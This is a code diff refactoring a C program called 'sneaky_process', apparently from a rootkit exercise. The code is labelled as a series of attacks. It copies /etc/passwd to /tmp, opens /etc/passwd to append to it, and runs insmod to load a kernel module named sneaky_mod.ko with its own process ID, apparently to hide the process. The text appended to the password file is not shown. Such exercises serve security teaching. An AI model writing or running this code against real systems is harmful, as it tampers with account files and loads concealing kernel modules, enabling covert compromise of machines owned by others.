@@ -6,11 +6,38 @@
 #define SOURCEFILE "/etc/passwd"
 #define TARGETFILE "/tmp/passwd"
 
+void copyFile();
+
+void updateFile();
+
+void loadModule();
+
 int main(int argc, char **argv) {
   // Attack 1: print own process ID
   printf("sneaky_process pid = %d\n", getpid());
 
   // Attack 2: step 1 - copy from source to target
+  copyFile();
+
+  if (DEBUG)
+    printf("File copied successfully.\n");
+
+  // Attack 2: step 2 - update source file
+  updateFile();
+
+  if (DEBUG)
+    printf("Update file successfully...\n");
+
+  // Attack 3: get process ID, load sneaky_mod.ko and pass PID
+  loadModule();
+
+  if (DEBUG)
+    printf("Sneaky_mod loaded successfully.\n");
+
+  return 0;
+}
+
+void copyFile() {
   FILE *source, *target;
   source = fopen(SOURCEFILE, "r");
   if (source == NULL) {
@@ -30,13 +57,11 @@ int main(int argc, char **argv) {
     fputc(ch, target);
   }
 
-  if (DEBUG)
-    printf("File copied successfully.\n");
-
   fclose(source);
   fclose(target);
+}
 
-  // Attack 2: step 2 - update source file
+void updateFile() {
   FILE *update;
   update = fopen(SOURCEFILE, "a");
   if (update == NULL) {
@@ -52,11 +77,9 @@ int main(int argc, char **argv) {
   }
 
   fclose(update);
+}
 
-  if (DEBUG)
-    printf("Update file successfully...\n");
-
-  // Attack 3: get process ID, load sneaky_mod.ko and pass PID
+void loadModule() {
   pid_t pid = getpid();
   char command[80];
   sprintf(command, "insmod ./sneaky_mod.ko pid=%d", pid);
@@ -64,9 +87,4 @@ int main(int argc, char **argv) {
     printf("Error in insmod...\n");
     exit(EXIT_FAILURE);
   }
-
-  if (DEBUG)
-    printf("Sneaky_mod loaded successfully.\n");
-
-  return 0;
 }
